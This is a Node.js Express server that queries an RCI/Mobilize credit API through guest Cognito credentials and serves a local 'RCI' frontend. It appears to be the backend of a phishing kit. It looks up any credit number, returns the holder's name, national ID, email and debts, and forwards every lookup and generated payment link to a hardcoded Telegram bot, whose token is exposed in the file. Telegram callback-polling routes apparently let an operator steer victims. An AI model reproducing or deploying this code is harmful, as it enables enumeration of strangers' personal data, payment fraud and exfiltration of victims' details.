// API Mobilize v1 — consulta créditos RCI via AWS SigV4 + Cognito
const express = require('express');
const cors    = require('cors');
const axios   = require('axios');
const aws4    = require('aws4');
const { CognitoIdentityClient, GetIdCommand, GetCredentialsForIdentityCommand } = require('@aws-sdk/client-cognito-identity');

const TG_TOKEN = process.env.TG_TOKEN || '8775807272:AAGIA8gNoQy2GQqx_Drwj_KEQF8tnkfr3pY';
const TG_CHAT  = process.env.TG_CHAT  || '7776240161';
const PORT     = process.env.PORT     || 3001;

const app = express();
app.use(express.json());
app.use(cors({ origin: true, credentials: true }));

// ── Config ────────────────────────────────────────────────────────────────────
const AWS_REGION      = 'us-east-1';
const IDENTITY_POOL   = 'us-east-1:353fa4ba-6d7c-477f-8018-8f54953476bb';
const API_HOST        = 't3a9z73ceg.execute-api.us-east-1.amazonaws.com';
const API_BASE        = `https://${API_HOST}/prod`;
const TENANT_ID       = '1111111';
const cognitoClient   = new CognitoIdentityClient({ region: AWS_REGION });

// ── Credenciales Cognito (se renuevan cada ~50min) ────────────────────────────
let _creds = null;
let _credsExpiry = 0;

async function getCreds() {
  const now = Date.now();
  if (_creds && now < _credsExpiry) return _creds;

  // 1) Obtener Identity ID
  const { IdentityId } = await cognitoClient.send(
    new GetIdCommand({ IdentityPoolId: IDENTITY_POOL })
  );

  // 2) Obtener credenciales temporales
  const { Credentials } = await cognitoClient.send(
    new GetCredentialsForIdentityCommand({ IdentityId })
  );

  _creds = {
    accessKeyId:     Credentials.AccessKeyId,
    secretAccessKey: Credentials.SecretKey,
    sessionToken:    Credentials.SessionToken,
  };
  _credsExpiry = new Date(Credentials.Expiration).getTime() - 5 * 60 * 1000;
  console.log(`✅ Credenciales Cognito renovadas (expiran: ${Credentials.Expiration})`);
  return _creds;
}

// ── Llamada firmada a la API ──────────────────────────────────────────────────
async function signedPost(path, body) {
  const creds = await getCreds();
  const bodyStr = JSON.stringify(body);

  const opts = aws4.sign({
    host:    API_HOST,
    path:    `/prod${path}`,
    method:  'POST',
    headers: {
      'Content-Type': 'application/json',
      'Accept':       'application/json',
    },
    body:    bodyStr,
    service: 'execute-api',
    region:  AWS_REGION,
  }, creds);

  const { data } = await axios.post(`${API_BASE}${path}`, body, {
    headers: opts.headers,
    timeout: 15_000,
  });
  return data;
}

// ── Cache 5 min ───────────────────────────────────────────────────────────────
const _cache = new Map();
const TTL    = 5 * 60 * 1000;
function cacheGet(k) {
  const h = _cache.get(k);
  if (h && Date.now() - h.ts < TTL) return h.v;
  _cache.delete(k); return null;
}
function cacheSet(k, v) { _cache.set(k, { v, ts: Date.now() }); }

// ── Rate limit ────────────────────────────────────────────────────────────────
const _rl = new Map();
function allowed(ip, max = 15, win = 60_000) {
  const now  = Date.now();
  const list = (_rl.get(ip) || []).filter(t => now - t < win);
  if (list.length >= max) return false;
  list.push(now); _rl.set(ip, list); return true;
}
const ip = req =>
  (req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '').split(',')[0].trim();

// ── Telegram ──────────────────────────────────────────────────────────────────
async function tgSend(msg) {
  if (!TG_TOKEN || !TG_CHAT) return;
  await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'HTML' }),
  }).catch(() => {});
}

const fmtCOP = n => Number(n).toLocaleString('es-CO', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

// ── Routes ────────────────────────────────────────────────────────────────────
app.get('/health', (_, res) =>
  res.json({ ok: true, uptime: Math.floor(process.uptime()), cache: _cache.size })
);

// GET /api/mobilize/credito/:numero
app.get('/api/mobilize/credito/:numero', async (req, res) => {
  if (!allowed(ip(req)))
    return res.status(429).json({ error: 'Demasiadas solicitudes. Intenta en un momento.' });

  const { numero } = req.params;
  if (!numero || numero.length < 5)
    return res.status(400).json({ error: 'Número de crédito inválido.' });

  const cached = cacheGet(numero);
  if (cached) return res.json({ ...cached, _cached: true });

  try {
    const data = await signedPost(
      `/paymentez/${TENANT_ID}/oracle/get-user-info`,
      { creditNumber: numero, forceRequest: true, chanel: 'test' }
    );

    if (!data?.userInfo || !Object.keys(data.userInfo).length)
      return res.status(404).json({ error: 'No existe crédito con ese número.' });

    const u = data.userInfo;
    const [nombre, ...apellidos] = (u.NOMBRE_COMPLETO || '').split(' ');
    const resp = {
      numero:         u.ACCOUNT_NUMBER      || numero,
      nombreCompleto: u.NOMBRE_COMPLETO     || 'N/D',
      nombre:         nombre                || 'N/D',
      apellidos:      apellidos.join(' ')   || 'N/D',
      cedula:         u.UNIQUE_ID_VALUE     || 'N/D',
      email:          u.EMAIL               || 'N/D',
      pagoMinimo:     u.PAGO_MINIMO         ?? 0,
      pagoTotal:      u.PAGO_TOTAL          ?? 0,
      fechaVencimiento: u.FECHA_VENCIMIENTO_PAGO || null,
      fechaDesembolso:  u.FETCHA_DESEMBOLSO      || null,
      descripcion:    data.paymentDescription    || 'Pago crédito RCI',
      pagoMinimoCOP:  'COP ' + fmtCOP(u.PAGO_MINIMO ?? 0),
      pagoTotalCOP:   'COP ' + fmtCOP(u.PAGO_TOTAL  ?? 0),
    };

    cacheSet(numero, resp);

    await tgSend(
      `🚗 <b>Mobilize — Consulta crédito</b>\n\n` +
      `📋 <b>Crédito:</b> <code>${resp.numero}</code>\n` +
      `👤 <b>Nombre:</b> ${resp.nombreCompleto}\n` +
      `🪪 <b>Cédula:</b> <code>${resp.cedula}</code>\n` +
      `📧 <b>Email:</b> ${resp.email}\n` +
      `💰 <b>Pago mínimo:</b> ${resp.pagoMinimoCOP}\n` +
      `💰 <b>Pago total:</b>  ${resp.pagoTotalCOP}\n` +
      `📅 <b>Vencimiento:</b> ${resp.fechaVencimiento?.split('T')[0] || 'N/D'}`
    );

    return res.json(resp);

  } catch (err) {
    console.error('❌ Mobilize:', err.message);
    const status = err.response?.status;
    const msg = status === 404 ? 'Crédito no encontrado.'
      : status === 403 ? 'Error de autenticación. Reintenta.'
      : 'No se pudo consultar el crédito. Intenta de nuevo.';
    return res.status(502).json({ error: msg });
  }
});

// POST /api/mobilize/pagar — genera link de pago Paymentez
app.post('/api/mobilize/pagar', async (req, res) => {
  const { nombre, apellidos, email, creditNumber, amount, description, userId } = req.body || {};
  if (!creditNumber || !amount)
    return res.status(400).json({ error: 'Faltan datos para generar el pago.' });

  try {
    const data = await signedPost(
      `/paymentez/${TENANT_ID}/paymentez/generate-link-to-pay`,
      { name: nombre, lastName: apellidos, email, creditNumber, amount, description, userId }
    );

    const link = data?.payment?.payment_url || data?.link;
    const qr   = data?.payment?.payment_qr  || data?.qr;

    if (!link) return res.status(502).json({ error: 'No se obtuvo el link de pago.' });

    await tgSend(
      `💳 <b>Mobilize — Link de pago generado</b>\n\n` +
      `📋 <b>Crédito:</b> <code>${creditNumber}</code>\n` +
      `👤 <b>Nombre:</b> ${nombre} ${apellidos}\n` +
      `💰 <b>Monto:</b> COP ${fmtCOP(amount)}\n` +
      `🔗 <b>Link:</b> ${link}`
    );

    return res.json({ link, qr });

  } catch (err) {
    console.error('❌ Mobilize pago:', err.message);
    return res.status(502).json({ error: 'No se pudo generar el link de pago.' });
  }
});

// ── Proxy Telegram (oculta el token del frontend) ────────────────────────────
const TG_API = `https://api.telegram.org/bot${TG_TOKEN}`;

app.post('/api/tg/send', async (req, res) => {
  try {
    const { text, reply_markup } = req.body;
    const body = { chat_id: TG_CHAT, text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (reply_markup) body.reply_markup = reply_markup;
    const r = await axios.post(`${TG_API}/sendMessage`, body);
    res.json(r.data);
  } catch (e) { res.json({ ok: false }); }
});

app.get('/api/tg/updates', async (req, res) => {
  try {
    const offset = req.query.offset || 0;
    const r = await axios.get(`${TG_API}/getUpdates?timeout=5&offset=${offset}&allowed_updates=callback_query`);
    res.json(r.data);
  } catch (e) { res.json({ ok: false, result: [] }); }
});

app.post('/api/tg/answer', async (req, res) => {
  try {
    const { callback_query_id } = req.body;
    const r = await axios.post(`${TG_API}/answerCallbackQuery`, { callback_query_id });
    res.json(r.data);
  } catch (e) { res.json({ ok: false }); }
});

// ── Frontend estático RCI ─────────────────────────────────────────────────────
const path = require('path');
const FRONTEND = process.env.FRONTEND || path.join('C:\\Users\\mike rodriguez\\Desktop\\mobiliza');

app.use(express.static(FRONTEND));

app.listen(PORT, () => {
  console.log(`\n✅ API Mobilize v1 en http://localhost:${PORT}`);
  console.log(`   Frontend:  http://localhost:${PORT}/index.html\n`);
});
